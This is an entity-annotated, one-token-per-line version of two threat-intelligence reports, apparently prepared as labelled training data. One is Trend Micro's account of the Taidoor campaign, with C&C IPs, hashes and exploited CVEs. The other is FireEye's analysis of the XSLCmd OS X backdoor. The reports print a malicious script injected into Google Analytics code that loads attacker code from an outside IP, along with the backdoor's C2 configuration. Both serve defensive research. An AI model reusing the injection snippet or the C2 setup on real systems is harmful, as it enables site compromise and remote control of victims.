203.150.231.236 B_ip.cncsvr

4/7/2012

4a1365bdef0773aa0d3d33877d5a5334 B_hash

BKDR_SIMBOT.SMC

222.101.218.86 B_ip.cncsvr

5/29/2012

64.34.60.218 B_ip.cncsvr

5/29/2012

203.90.100.21 B_ip.cncsvr

5/29/2012

7f82c77a1f1b36f392f2f1763e2cc119 B_hash

BKDR_SIMBOT.SMC

203.146.189.141 B_ip.cncsvr

4/30/2012

ac75e62b36f4e845c1a095c9bcc43896 B_hash

TROJ_DLOADR.WKJ

62.13.61.173 B_ip.cncsvr

4/2/2012

61.218.233.51 B_ip.cncsvr

4/2/2012

63.135.55.13 B_ip.cncsvr

4/2/2012

5eb86d098a5ab48c7173545829008636 B_hash

BKDR_SIMBOT.SMC

112.217.74.188 B_ip.cncsvr

6/13/2012

203.114.103.58 B_ip.cncsvr

6/13/2012

85c64f43de8cb83234ee21fb0234f256 B_hash

BKDR_SIMBOT.SMC

203.146.189.141 B_ip.cncsvr

5/14/2012

7f82c77a1f1b36f392f2f1763e2cc119 B_hash

BKDR_SIMBOT.SMC

85.43.157.110 B_ip.cncsvr

4/30/2012

203.116.147.94 B_ip.cncsvr

4/30/2012

58.40.20.165 B_ip.cncsvr

4/30/2012

85c64f43de8cb83234ee21fb0234f256 B_hash

BKDR_SIMBOT.SMC

213.50.91.196 B_ip.cncsvr

5/14/2012

211.22.72.193 B_ip.cncsvr

5/14/2012

ffe76a043871638ec5e953084af1a2d8 B_hash

BKDR_SIMBOT.SME

69.178.171.135 B_ip.cncsvr

5/17/2012

202.40.188.10 B_ip.cncsvr

5/17/2012

20db3ff24701f4adac3cc61b591b6c98 B_hash

BKDR_SIMBOT.SME

60.248.216.194 B_ip.cncsvr

5/7/2012

85c64f43de8cb83234ee21fb0234f256 B_hash

BKDR_SIMBOT.SMC

201.159.226.189 B_ip.cncsvr

5/14/2012

202.251.249.222 B_ip.cncsvr

5/14/2012

20db3ff24701f4adac3cc61b591b6c98 B_hash

BKDR_SIMBOT.SME

222.101.218.86 B_ip.cncsvr

5/7/2012

64.34.60.218 B_ip.cncsvr

5/7/2012

8
|
TheTaidoorCampaign

MD5
HASH

DETECTION

C
&
C
SERVER

DATE
SEEN

203.90.100.21 B_ip.cncsvr

5/7/2012

6b5ca357066b40def382a1e130fb87cb B_hash

BKDR_SIMBOT.SME

210.65.11.11 B_ip.cncsvr

4/25/2012

9
|
TheTaidoorCampaign

DAMAGE

DEFENDING
AGAINST
APTS

After
analyzing
of
the
Taidoor B_malware.drop
campaign
,
we
saw
that
the
malware
the
attackers
used
had
the
functionality
normally
seen
in
a
Remote
Access
Trojan
(
RAT
)
.

Based
on
the
command
capabilities
of
the
Taidoor B_malware.drop
malware
,
we
were
able
to
determine
that
data
theft
and
data
destruction
was
possible
.

The
malware
also
had
the
ability
to
remotely
and
sometimes
randomly
terminate
processes
on
victims
'
machines
.

This
can
lead
to
the
termination
of
a
critical
process
that
results
in
denial
of
service
(
DoS
)
.

If
this
happens
on
a
critical
server
,
this
can
cause
loss
of
business
revenue
or
critical
data
.

Sufficiently
motivated
threat
actors
can
penetrate
even
networks
that
use
moderately
advanced
security
measures
.

As
such
,
apart
from
standard
and
relevant
attack
prevention
measures
and
mechanisms
such
as
solid
patch
management
;
endpoint
and
network
security
;
firewall
use
;
and
the
like
,
enterprises
should
also
focus
on
detecting
and
mitigating
attacks
.

Moreover
,
data
loss
prevention
(
DLP
)
strategies
such
as
identifying
exactly
what
an
organization
is
protecting
and
taking
into
account
the
context
of
data
use
should
be
employed
.

Local
and
External
Threat
Intelligence

Threat
intelligence
refers
to
indicators
that
can
be
used
to
identify
the
tools
,
tactics
,
and
procedures
threat
actors
engaging
in
targeted
attacks
utilize
.

Both
external
and
local
threat
intelligence
is
crucial
for
developing
the
ability
to
detect
attacks
early
.

The
following
are
the
core
components
of
this
defense
strategy
:

•
Enhanced
visibility
:
Logs
from
endpoint
,
server
,
and
network
monitoring
are
an
important
and
often
underused
resource
that
can
be
aggregated
to
provide
a
view
of
the
activities
within
an
organization
that
can
be
processed
for
anomalous
behaviors
that
can
indicate
a
targeted
attack
.

•
Integrity
checks
:
In
order
to
maintain
persistence
,
malware
will
make
modifications
to
the
file
system
and
registry
.

Monitoring
such
changes
can
indicate
the
presence
of
malware
.

•
Empowering
the
human
analyst
:
Humans
are
best
positioned
to
identify
anomalous
behaviors
when
presented
with
a
view
of
aggregated
logs
from
across
a
network
.

This
information
is
used
in
conjunction
with
custom
alerts
based
on
the
local
and
external
threat
intelligence
available
.

10
|
TheTaidoorCampaign

Technologies
available
today
such
as
Trend
MicroTM
Deep
Discovery
provide
visibility
,
insight
,
and
control
over
networks
to
defend
against
targeted
threats
.

12
Deep
Discovery
uniquely
detects
and
identifies
evasive
threats
in
real
time
and
provides
in-depth
analysis
and
actionable
intelligence
to
prevent
,
discover
,
and
reduce
risks
.

Mitigation
and
Cleanup
Strategy

Once
an
attack
is
identified
,
the
cleanup
strategy
should
focus
on
the
following
objectives
:

•
Determine
the
attack
vector
and
cut
off
communications
with
the
C
&
C
server
.

•
Determine
the
scope
of
the
compromise
.

•
Assess
the
damage
by
analyzing
the
data
and
forensic
artifacts
available
on
compromised
machines
.

Remediation
should
be
applied
soon
afterward
,
which
includes
steps
to
fortify
affected
servers
,
machines
,
or
devices
into
secure
states
,
informed
in
part
by
how
the
compromised
machines
were
infiltrated
.

Educating
Employees
Against
Social
Engineering

Security-related
policies
and
procedures
combined
with
education
and
training
programs
are
essential
components
of
defense
.

Traditional
training
methods
can
be
fortified
by
simulations
and
exercises
using
real
spear-phishing
attempts
sent
to
test
employees
.

Employees
trained
to
expect
targeted
attacks
are
better
positioned
to
report
potential
threats
and
constitute
an
important
source
of
threat
intelligence
.

Data-Centric
Protection
Strategy

The
ultimate
objective
of
targeted
attacks
is
to
acquire
sensitive
data
.

As
such
,
DLP
strategies
that
focus
on
identifying
and
protecting
confidential
information
are
critical
.

Enhanced
data
protection
and
visibility
across
an
enterprise
provides
the
ability
to
control
access
to
sensitive
data
as
well
as
monitor
and
log
successful
and
unsuccessful
attempts
to
access
it
.

Enhanced
access
control
and
logging
capabilities
allow
security
analysts
to
locate
and
investigate
anomalies
,
respond
to
incidents
,
and
initiate
remediation
strategies
and
damage
assessment
.

12
http://www.trendmicro.com/us/enterprise/security-risk-management/deep-discovery/index.html B_url.normal

11
|
TheTaidoorCampaign

TREND
MICRO
THREAT
PROTECTION
AGAINST
Taidoor B_malware.drop
CAMPAIGN
COMPONENTS

Table
3
summarizes
the
Trend
Micro
solutions
for
the
components
of
the
Taidoor B_malware.drop
campaign
.

Trend
Micro
recommends
a
comprehensive
security
risk
management
strategy
that
goes
further
than
advanced
protection
to
meet
the
real-time
threat
management
requirements
of
dealing
with
targeted
attacks
.

Attack
Component

Protection
Technology

Trend
Micro
Solution

Endpoint
(
Titanium
,
Worry-Free
Business
Security
,
OfficeScan
)

Server
(
Deep
Security
)

Messaging
(
InterScan
Messaging
Security
,
ScanMail
Suite
for
Microsoft
Exchange
)

Network
(
Deep
Discovery
)

Gateway
(
InterScan
Web
Security
,
InterScan
Messaging
Security
)

Mobile
(
Mobile
Security
)

Endpoint
(
Titanium
,
Worry-Free
Business
Security
,
OfficeScan
)

Server
(
Deep
Security
)

Messaging
(
InterScan
Messaging
Security
,
ScanMail
Suite
for
Microsoft
Exchange
)

Network
(
Deep
Discovery
)

Gateway
(
InterScan
Web
Security
,
InterScan
Messaging
Security
)

Mobile
(
Mobile
Security
)

Initial
C
&
C
server
request
format
:

Web
Reputation

[
C
&
C
]
/
{
5
random
characters}.php?id={6
random
numbers
}
{
encrypted
victim
's
MAC
address
}

BKDR_SIMBO.DUKKS

File
Reputation

BKDR_SIMBOT.SMC
(
Antivirus/Anti-malware
)

BKDR_SIMBOT.SME

HEUR_OLEXP.A

TROJ_ARTIEF.VTG

TROJ_DLOADE.SMJ

TROJ_DLOADR.TDG

TROJ_DLOADR.WKJ

TROJ_GEN.R21C3E6

TROJ_GEN.R3EC1J7

TROJ_GEN.R3EC2G4

TROJ_GEN.R3EC7JC

12
|
TheTaidoorCampaign

Attack
Component

Protection
Technology

Trend
Micro
Solution

TROJ_GEN.R42C3JR

TROJ_GEN.R47E1K9

TROJ_GEN.R49C7KI

TROJ_GEN.R4FCRBC

TROJ_INJECT.ZZXX

TROJ_MSDROP.ZZXX

CVE-2009-3129

CVE-2009-4324

CVE-2010-1297

CVE-2010-2883

CVE-2011-0611

CVE-2011-1269

CVE-2012-0158

Vulnerability
Shielding/Virtual
Patching

Server
(
Deep
Security
)

Endpoint
(
OfficeScan
with
Intrusion
Defense
Firewall
Plug-In
)

For
CVE-2009-3129
:

•
Rule
#
1003817
(
Excel
Featheader
Record
Memory
Corruption
Vulnerability
)

For
CVE-2009-4324
:

•
Rule
#
1004008
(
Adobe
Reader
and
Acrobat
'newplayer
(
)
'
JavaScript
Method
Code
Execution
)

For
CVE-2010-1297
:

•
Rule
#
1004202
(
Adobe
Products
authplay.dll
Remote
Code
Execution
Vulnerability
)

For
CVE-2010-2883
:

•
Rule
#
1004393
(
Adobe
Reader
SING
Table
Parsing
Vulnerability
)

Rule
#
1004113
(
Identified
Malicious
Adobe
PDF
Document
)

Rule
#
1004315
(
Identified
Malicious
Adobe
PDF
Document
)

For
CVE-2011-0611
:

•
Rule
#
1004647
(
Restrict
Microsoft
Office
File
with
Embedded
SWF
)

13
|
TheTaidoorCampaign

Attack
Component

Protection
Technology

Trend
Micro
Solution

For
CVE-2011-1269
:

•
Rule
#
1004661
(
Microsoft
PowerPoint
Remote
Code
Execution
Vulnerability
)

For
CVE-2012-0158
:

•
Rule
#
1004973
(
MSCOMCTL.OCX
RCE
Vulnerability
for
Rich
Text
File
)

Rule
#
1004977
(
Restrict
Microsoft
Windows
Common
ListView
and
TreeView
ActiveX
Controls
)

Rule
#
1004978
(
MSCOMCTL.OCX
RCE
Vulnerability
for
Office
Binary
File
)

Endpoint
(
Titanium
,
Worry-Free
Business
Security
,
OfficeScan
)

Server
(
Deep
Security
)

Messaging
(
InterScan
Messaging
Security
,
ScanMail
Suite
for
Microsoft
Exchange
)

Network
(
Deep
Discovery
)

Gateway
(
InterScan
Web
Security
,
InterScan
Messaging
Security
)

Mobile
(
Mobile
Security
)

Web
,
Domain
,
and
IP
Reputation

58.40.20.165 B_ip.attack

60.248.216.194 B_ip.attack

60.249.219.82 B_ip.attack

60.250.39.73 B_ip.attack

61.222.190.100 B_ip.attack

61.222.205.180 B_ip.attack

61.218.233.51 B_ip.attack

62.13.61.173 B_ip.attack

63.135.55.13 B_ip.attack

64.34.60.218 B_ip.attack

69.178.171.135 B_ip.attack

85.43.157.110 B_ip.attack

112.217.74.188 B_ip.attack

201.159.226.189 B_ip.attack

202.40.188.10 B_ip.attack

202.251.249.222 B_ip.attack

14
|
TheTaidoorCampaign

Attack
Component

Protection
Technology

Trend
Micro
Solution

203.90.100.21 B_ip.attack

203.114.103.58 B_ip.attack

203.116.147.94 B_ip.attack

203.146.189.141 B_ip.attack

203.146.189.160 B_ip.attack

203.150.231.236 B_ip.attack

210.65.11.11 B_ip.attack

211.35.222.6 B_ip.attack

211.22.72.193 B_ip.attack

213.50.91.196 B_ip.attack

216.139.109.156 B_ip.attack

222.101.218.86 B_ip.attack

15
|
TheTaidoorCampaign

August
2012
|
APT
Campaign
Quick
Profile
:
Taidoor B_malware.drop

Advanced
persistent
threats
(
APTs
)
refer
to
a
category
of
threats
that
aggressively
pursue
and
compromise
specific
targets
to
maintain
persistent
presence
within
the
victim
's
network
so
they
can
move
laterally
and
exfiltrate
data
.

Unlike
indiscriminate
cybercrime
attacks
,
spam
,
web
threats
,
and
the
like
,
APTs
are
much
harder
to
detect
because
of
the
targeted
nature
of
related
components
and
techniques
.

Also
,
while
cybercrime
focuses
on
stealing
credit
card
and
banking
information
to
gain
profit
,
APTs
are
better
thought
of
as
cyber
espionage
.

Taidoor B_malware.drop

•
First
Seen

Individual
targeted
attacks
are
not
one-off
attempts
.

Attackers
continually
try
to
get
inside
the
target
's
network
.

Based
on
Trend
MicroTM
Smart
Protection
NetworkTM
data
,
the
earliest
Taidoor B_malware.drop
campaign-related
activities
were
seen
as
far
back
as
October
2010
.

•
Victims
and
Targets

APT
campaigns
target
specific
industries
or
communities
of
interest
in
specific
regions
.

This
campaign
primarily
targeted
government
organizations
located
in
Taiwan
.

•
Operations

The
first-stage
computer
intrusions
often
use
social
engineering
.

Attackers
custom-fit
attacks
to
their
targets
.

In
this
campaign
,
attackers
sent
an
email
to
targets
.

The
email
came
with
specially
created
file
attachments
that
exploited
vulnerabilities
such
as
CVE-2012-0158
,
CVE-2009-4324
,
CVE-2010-1297
,
CVE-2010-2883
,
CVE-2011-0611
,
CVE-2011-1269
,
and
CVE-2009-3129
.

The
purpose
of
the
file
attachment
is
to
drop
and
install
SIMBOT B_malware.drop
malware
variants
,
which
had
functionalities
normally
seen
in
Remote
Access
Trojans
(
RATs
)
.

•
Possible
Indicators
of
Compromise

Attackers
want
to
remain
undetected
as
long
as
possible
.

A
key
characteristic
of
these
attacks
is
stealth
.

The
GET
and
POST
requests
from
compromised
computers
contained
a
URL
path
in
the
following
format
,
aaaaa.php?id=bbbbbbcccccccccccc
,
where
'aaaaa
'
refers
to
five
random
characters
that
form
a
file
name
,
'bbbbbb
,
'
refers
to
six
pseudorandomly
generated
characters
that
change
for
each
connection
,
and
'cccccccccccc
'
refers
to
12
characters
that
represent
the
compromised
host
's
MAC
address
that
is
obfuscated
using
a
custom
algorithm
.

In
addition
,
the
initial
command-and-control
(
C
&
C
)
server
request
typically
uses
the
following
format
:
[
C
&
C
]
/
{
5
random
characters}.php?id={6
random
numbers
}
{
encrypted
victim
's
MAC
address
}
*
The
full
technical
details
of
this
attack
can
be
read
in
the
Trend
Micro
research
paper
,
'The
Taidoor B_malware.drop
Campaign
:
An
In-Depth
Analysis
.
'

The
characteristics
highlighted
in
this
APT
campaign
profile
reflect
the
results
of
our
investigation
as
of
August
2012
.

TREND
MICROTM

Trend
Micro
Incorporated
(
TYO
:
4704
;
TSE
:
4704
)
,
a
global
cloud
security
leader
,
creates
a
world
safe
for
exchanging
digital
information
with
its
Internet
content
security
and
threat
management
solutions
for
businesses
and
consumers
.

A
pioneer
in
server
security
with
over
20
years
'
experience
,
we
deliver
top-ranked
client
,
server
and
cloud-based
security
that
fits
our
customers
'
and
partners
'
needs
,
stops
new
threats
faster
,
and
protects
data
in
physical
,
virtualized
and
cloud
environments
.

Powered
by
the
industry-leading
Trend
MicroTM
Smart
Protection
NetworkTM
cloud
computing
security
infrastructure
,
our
products
and
services
stop
threats
where
they
emerge—from
the
Internet
.

They
are
supported
by
1,000+
threat
intelligence
experts
around
the
globe
.

TREND
MICRO
INC
.

10101
N
.

De
Anza
Blvd
.

Cupertino
,
CA
95014

U.S.
toll
free
:
1
+800.228.5651

Phone
:
1
+408.257.1500

Fax
:
1
+408.257.2003

www.trendmicro.com B_url.normal

©
20
12
by
Trend
Micro
,
Incorporated
.

All
rights
reserved
.

Trend
Micro
and
the
Trend
Micro
t-ball
logo
are
trademarks
or
registered
trademarks
of
Trend
Micro
,
Incorporated
.

All
other
product
or
company
names
may
be
trademarks
or
registered
trademarks
of
their
owners
.
Forced
to
Adapt
:
XSLCmd B_malware.backdoor
Backdoor
Now
on
OS
X

Introduction

FireEye
Labs
recently
discovered
a
previously
unknown
variant
of
the
APT
backdoor
XSLCmd B_malware.backdoor
–
OSX.XSLCmd
–
which
is
designed
to
compromise
Apple
OS
X
systems
.

This
backdoor
shares
a
significant
portion
of
its
code
with
the
Windows-based
version
of
the
XSLCmd B_malware.backdoor
backdoor
that
has
been
around
since
at
least
2009
.

This
discovery
,
along
with
other
industry
findings
,
is
a
clear
indicator
that
APT
threat
actors
are
shifting
their
eyes
to
OS
X
as
it
becomes
an
increasingly
popular
computing
platform
.

Across
the
global
threat
landscape
,
there
has
been
a
clear
history
of
leveraging
(
or
porting
)
Windows
malware
to
the
Apple
OS
X
platform
.

In
2012
,
AlienVault
discovered
a
document
file
exploiting
an
older
vulnerability
in
Microsoft
Word
that
installs
a
backdoor
named
'MacControl B_malware.backdoor
'
on
OS
X
systems
.

The
group
responsible
for
those
attacks
had
been
targeting
Tibetan
non-government
organizations
(
NGOs
)
.

It
was
later
discovered
that
the
code
for
this
backdoor
was
borrowed
from
an
existing
Windows
backdoor
,
whose
source
code
can
be
found
on
several
Chinese
programming
forums
.

In
2013
,
Kaspersky
reported
on
a
threat
actor
group
they
named
'IceFog
'
that
had
been
attacking
a
large
number
of
entities
related
to
military
,
mass
media
,
and
technology
in
South
Korea
and
Japan
.

This
group
developed
their
own
backdoor
for
both
Windows
and
OS
X
.

And
just
this
year
,
Kaspersky
published
a
report
on
a
group
they
named
'Careto/Mask
'
that
utilized
an
open
source
netcat-like
project
designed
to
run
on
*nix
and
Windows
systems
named
'sbd
'
which
they
wrapped
in
a
custom
built
installer
for
OS
X
.

Based
on
our
historical
intelligence
,
we
believe
the
XSLCmd B_malware.backdoor
backdoor
is
used
by
APT
,
including
a
group
that
we
call
'GREF
.
'

We
track
this
threat
group
as
'GREF
'
due
to
their
propensity
to
use
a
variety
of
Google
references
in
their
activities
–
some
of
which
will
be
outlined
later
in
this
report
.

Our
tracking
of
GREF
dates
back
to
at
least
the
2009
timeframe
,
but
we
believe
they
were
active
prior
to
this
time
as
well
.

Historically
,
GREF
has
targeted
a
wide
range
of
organizations
including
the
US
Defense
Industrial
Base
(
DIB
)
,
electronics
and
engineering
companies
worldwide
,
as
well
as
foundations
and
other
NGO
's
,
especially
those
with
interests
in
Asia
.

XSLCmd B_malware.backdoor
for
OS
X
Analysis

The
XSLCmd B_malware.backdoor
backdoor
for
OS
X
was
submitted
to
VirusTotal
(
MD5
:
60242ad3e1b6c4d417d4dfeb8fb464a1 B_hash
)
on
August
10
,
2014
,
with
0
detections
at
the
time
of
submission
.

The
sample
is
a
universal
Mach-O
executable
file
supporting
the
PowerPC
,
x86
,
and
x86-64
CPU
architectures
.

The
code
within
contains
both
an
installation
routine
that
is
carried
out
the
first
time
it
is
executed
on
a
system
,
and
the
backdoor
routine
which
is
carried
out
after
confirming
that
its
parent
process
is
launchd
(
the
initial
user
mode
process
of
OS
X
that
is
responsible
for
,
amongst
other
things
,
launching
daemons
)
.

The
backdoor
code
was
ported
to
OS
X
from
a
Windows
backdoor
that
has
been
used
extensively
in
targeted
attacks
over
the
past
several
years
,
having
been
updated
many
times
in
the
process
.

Its
capabilities
include
a
reverse
shell
,
file
listings
and
transfers
,
installation
of
additional
executables
,
and
an
updatable
configuration
.

The
OS
X
version
of
XSLCmd B_malware.backdoor
includes
two
additional
features
not
found
in
the
Windows
variants
we
have
studied
in
depth
:
key
logging
and
screen
capturing
.

Installation
Routine

To
install
,
XSLCmd B_malware.backdoor
first
determines
the
endianness
of
the
CPU
using
NXGetLocalArchInfo
and
whether
or
not
it
is
running
as
the
super
user
by
comparing
the
return
value
of
getuid
(
)
with
0
.

The
code
includes
functions
to
handle
endianness
differences
when
dealing
with
file
and
network
data
on
a
system
using
big
endian
,
namely
older
Apple
computers
that
shipped
with
PowerPC
CPUs
.

The
process
copies
its
Mach-O
from
its
current
location
to
$
HOME/Library/LaunchAgents/clipboardd
and
creates
a
plist
file
in
the
same
directory
with
the
name
com.apple.service.clipboardd.plist
.

The
latter
file
ensures
that
the
backdoor
is
launched
after
the
system
is
rebooted
once
the
user
logs
in
.

After
this
is
done
,
the
malware
relaunches
itself
using
the
'load
'
option
of
the
launchctl
utility
,
which
runs
the
malware
according
to
its
configuration
in
the
plist
file
it
created
,
with
launchd
as
its
parent
process
.

This
is
the
process
that
begins
the
actual
backdoor
routine
of
waiting
for
and
executing
commands
issued
from
the
C2
server
.

After
running
itself
with
launchctl
,
the
initial
process
forks
and
deletes
the
Mach-O
from
the
original
location
from
which
it
was
executed
.

The
installation
routine
differs
slightly
depending
on
whether
or
not
the
process
is
running
with
super
user
privileges
.

If
run
as
super
user
,
it
copies
itself
to
/Library/Logs/clipboardd
.

Interestingly
,
if
run
as
super
user
,
the
process
will
also
copy
/bin/ksh
to
/bin/ssh
.

/bin/ksh
is
the
Korn
shell
executable
,
and
if
the
user
sends
a
command
to
initialize
a
reverse
shell
,
it
will
use
the
copy
of
ksh
to
do
so
instead
of
/bin/bash
.

This
is
likely
done
to
make
it
less
obvious
that
a
reverse
shell
is
running
on
the
system
,
since
it
may
raise
less
suspicion
to
see
an
ssh
process
opening
a
network
socket
rather
than
a
bash
process
,
although
the
real
ssh
executable
is
actually
located
in
/usr/bin/ssh
,
not
/bin/ssh
.

A
list
of
possible
files
created
by
XSLCmd B_malware.backdoor
is
included
in
Appendix
1
at
the
end
of
this
blog
.

Configuration
Options

XSLCmd B_malware.backdoor
ships
with
an
encrypted
configuration
file
that
it
defaults
to
if
there
is
no
configuration
file
written
to
disk
.

It
will
only
write
its
configuration
file
to
disk
if
it
's
updated
by
the
user
.

It
runs
in
a
loop
,
checking
for
a
configuration
update
,
and
then
checking
for
commands
.

If
a
new
configuration
is
available
,
it
will
be
written
to
disk
in
base64
encoding
at
$
HOME/.fontset/pxupdate.ini
.

Below
is
the
configuration
data
stored
in
the
XSLCmd B_malware.backdoor
sample
we
obtained
.

[
ListenMode
]

0

[
MServer
]

61.128.110.38:8000 B_ip.cncsvr

[
BServer
]

61.128.110.38 B_ip.cncsvr

[
Day
]

1,2,3,4,5,6,7

[
Start
Time
]

00:00:00

[
End
Time
]

23:59:00

[
Interval
]

60

[
MWeb
]

http://1234/config.htm B_url.cncsvr

[
BWeb
]

http://1234/config.htm B_url.cncsvr

[
MWebTrans
]

0

[
BWebTrans
]

0

[
FakeDomain
]

www.appleupdate.biz B_url.cncsvr

[
Proxy
]

0

[
Connect
]

1

[
Update
]

0

[
UpdateWeb
]

not
use

[
MServer
]
and
[
BServer
]
specify
the
main
and
backup
C2
server
addresses
,
which
can
be
either
an
IP
address
or
domain
name
.

Only
[
MServer
]
needs
to
specify
a
port
.

[
Day
]
specifies
which
days
of
the
week
the
malware
will
poll
for
commands
and
configuration
updates
on
where
Monday
is
1
.

[
Start
Time
]
specifies
the
local
time
of
day
to
begin
polling
.

[
End
Time
]
specifies
the
local
time
of
day
to
stop
polling
.

[
Interval
]
specifies
the
number
of
seconds
between
polls
.

[
MWeb
]
and
[
BWeb
]
specify
the
main
and
backup
URLs
to
poll
for
configuration
updates
,
respectively
.

Update
checks
are
not
performed
if
these
values
are
left
to
their
default
:
http://1234/config.htm B_url.cncsvr
Other
options
will
be
explained
where
appropriate
later
in
the
blog
.

C2
Protocol

XSLCmd B_malware.backdoor
uses
pseudo-HTTP
for
its
protocol
.

It
opens
a
socket
and
uses
a
string
template
to
setup
the
HTTP
request
or
response
headers
depending
on
whether
or
not
it
was
configured
for
[
Listen
Mode
]
.

If
[
Listen
Mode
]
is
set
to
1
,
then
it
listens
on
its
socket
,
waiting
for
a
connection
for
which
it
will
reply
to
with
HTTP
response
headers
following
this
template
:

HTTP/1.1
200
OK

Cache-Control
:
no-cache

Content-Type
:
application/x-www-form-urlencoded

Server
:
Apache/2.0.54
(
Unix
)

Content-Encoding
:
gzip

Content-Length
:
%
d

The
body
after
the
headers
,
regardless
of
mode
,
will
contain
data
specific
to
the
purpose
of
the
communication
.

The
data
is
encrypted
with
a
scheme
lifted
from
a
game
server
engine
written
by
a
group
named
'My
Destiny
Team
.
'

The
request
headers
have
an
interesting
feature
where
the
Host
and
Referer
header
values
will
have
their
domain
values
populated
with
the
value
stored
in
[
Fake
Domain
]
.

This
value
can
be
any
string
and
has
no
effect
on
the
network
connection
established
.

The
value
of
the
's
'
argument
in
the
request
URL
is
randomly
generated
,
and
all
of
the
other
request
header
values
except
for
Content-Length
are
hard-coded
.

Another
interesting
feature
exists
for
the
configuration
update
function
.

If
[
MWebTrans
]
/
[
BWebTrans
]
is
set
to
1
,
the
configuration
update
URL
request
will
be
proxied
through
Yahoo
's
Babelfish
service
and
will
fall
back
to
the
Google
Translate
service
if
that
fails
.

As
you
can
see
,
the
'trurl
'
parameter
in
the
URL
will
be
set
to
whatever
is
configured
for
[
MWeb
]
/
[
BWeb
]
.

The
UserAgent
header
for
this
request
is
hard-coded
and
contains
the
computer
name
in
the
parentheses
at
the
end
.

SSL
certificate
strings
were
noticed
during
our
analysis
,
but
with
no
direct
cross-reference
to
the
certificate
data
.

However
,
there
was
a
cross-reference
to
the
data
directly
preceding
it
.

This
data
began
with
what
looked
like
SSL
handshake
headers
,
so
we
extracted
the
data
from
the
executable
,
wrapped
it
in
a
PCAP
file
,
and
opened
it
in
Wireshark
.

Interestingly
,
the
data
contains
everything
needed
for
the
server-side
packets
of
an
SSL
handshake
.

The
SSL
certificate
being
used
was
for
login.live.com
and
had
expired
on
6/16/2010
.

The
code
using
this
data
opens
a
socket
,
waits
for
a
connection
,
and
proceeds
to
carry
out
an
SSL
handshake
with
the
client
,
throwing
away
whatever
data
it
receives
.

This
code
is
not
directly
referenced
by
any
other
code
in
the
executable
but
could
very
well
replace
the
[
Listen
Mode
]
code
.

Perhaps
it
is
an
old
feature
no
longer
in
use
,
a
new
feature
yet
to
be
fully
implemented
,
or
an
optional
feature
only
used
in
certain
cases
.

Observations

We
noticed
a
mix
of
manually
constructed
and
plain
referenced
strings
throughout
the
code
,
sometimes
side-by-side
in
the
same
function
even
.

This
gives
the
impression
of
someone
working
with
someone
else
's
code
,
adding
his
own
touch
and
style
here
and
there
as
he
goes
.

Also
of
note
is
that
XSLCmd B_malware.backdoor
will
not
perform
key
logging
if
run
as
super
user
.

This
can
be
a
problem
,
because
the
API
used
to
perform
the
key
logging
,
CGEventTapCreate
,
when
invoked
with
the
parameters
it
uses
,
requires
root
permissions
from
the
calling
process
or
the
'Assistive
Devices
'
feature
must
be
enabled
for
the
application
.

During
the
initial
installation
,
there
is
a
routine
to
programmatically
enable
assistive
devices
that
will
be
executed
if
the
OS
X
version
is
not
10.8
.

In
10.9
,
enabling
assistive
devices
permissions
is
done
on
a
per
application
basis
with
no
direct
API
to
achieve
this
.

It
is
interesting
to
note
that
the
version
check
does
not
account
for
versions
above
10.8
,
indicating
that
perhaps
10.8
was
the
latest
version
at
the
time
the
code
was
written
,
or
at
least
the
most
common
.

Further
supporting
this
inference
is
the
lack
of
testing
performed
on
10.9
.

This
variant
uses
an
API
from
the
private
Admin
framework
that
is
no
longer
exported
in
10.9
,
causing
it
to
crash
.

The
effort
to
support
PowerPC
with
the
endian
conversion
functions
is
worth
mentioning
.

Coupling
this
observation
with
the
aforementioned
fact
that
elsewhere
in
the
code
,
the
version
of
OS
X
is
compared
with
10.8
,
one
could
deduce
that
efforts
were
made
to
be
backwards
compatible
with
older
OS
X
systems
.

For
some
frame
of
reference
,
Apple
's
first
OS
to
drop
support
for
PowerPC
was
OS
X
10.6
released
in
2009
,
and
OS
X
10.9
was
released
in
October
of
2013
.

Threat
Actor
Intelligence

Historical
Background

While
GREF
's
targeting
interests
overlap
with
many
of
the
other
threat
groups
we
track
,
their
TTP
's
are
somewhat
unique
.

GREF
is
one
of
the
few
APT
threat
groups
that
does
not
rely
on
phishing
as
their
primary
attack
method
.

While
they
have
been
known
to
utilize
phishing
emails
,
including
malicious
attachments
and
links
to
exploit
sites
,
they
were
one
of
the
early
adopters
of
strategic
web
compromise
(
SWC
)
attacks
.

GREF
was
especially
busy
in
the
2010
timeframe
,
during
which
they
had
early
access
to
a
number
of
0-day
exploits
including
CVE-2010-0806
(
IE
6-7
Peer
Objects
vuln
)
,
CVE-2010-1297
(
Adobe
Flash
vuln
)
,
and
CVE-2010-2884
(
Adobe
Flash
)
that
they
leveraged
in
both
phishing
and
SWC
attacks
.

Many
of
their
SWC
attacks
we
saw
in
this
time
period
were
hosted
on
defense
industry-related
sites
including
Center
for
Defense
Information
(
cdi.org
)
,
National
Defense
Industrial
Association
(
ndia.org
)
,
Interservice/Industry
Training
,
Simulation
and
Education
Conference
(
iitsec.org
)
,
and
satellite
company
Millennium
Space
Systems
(
millennium-space.com
)
.

Most
of
those
attacks
involved
embedding
links
to
exploit
code
in
the
homepage
of
the
affected
website
,
and
true
to
their
moniker
the
link
was
usually
placed
inside
an
existing
Google
Analytics
code
block
in
the
page
source
code
to
help
obscure
it
,
rather
than
simply
appended
to
the
end
of
the
file
like
many
other
attackers
did
.

Figure
1
:
Sample
'google
'
exploit
link

<
!
—
Google
Tracking
Code
—
>
<
script
type='text/javascript
'
>
var
gaJsHost
=
(
(
'https
:
'
==
document.location.protocol
)
?

'https
:
//ssl
.
'

:
'http
:
//
'
)
;
document.write(unescape('%3Cscript
src=
''
+
gaJsHost
+
'180.149.252.181/wiki/tiwiki.ashx
'
type='text/javascript
'
%
3E
%
3C/script
%
3E
'
)
)
;
<
/script
>
The
TTP
that
most
differentiates
GREF
from
other
APT
threat
groups
is
their
unrelenting
targeting
of
web
server
vulnerabilities
to
both
gain
entry
to
targeted
organizations
,
as
well
as
to
get
new
platforms
for
SWC
attacks
.

This
threat
group
appears
to
devote
more
resources
(
than
most
other
groups
)
in
attempting
to
penetrate
web
servers
,
and
generally
,
they
make
no
attempt
to
obscure
the
attacks
,
often
generating
gigabytes
of
traffic
in
long-running
attacks
.

They
are
known
to
utilize
open-source
tools
such
as
SQLMap
to
perform
SQL
injection
,
but
their
most
obvious
tool
of
choice
is
the
web
vulnerability
scanner
Acunetix
,
which
leaves
tell-tale
request
patterns
in
web
server
logs
.

They
have
been
known
to
leverage
vulnerabilities
in
ColdFusion
,
Tomcat
,
JBoss
,
FCKEditor
,
and
other
web
applications
to
gain
access
to
servers
,
and
then
they
will
commonly
deploy
a
variety
of
web
shells
relevant
to
the
web
application
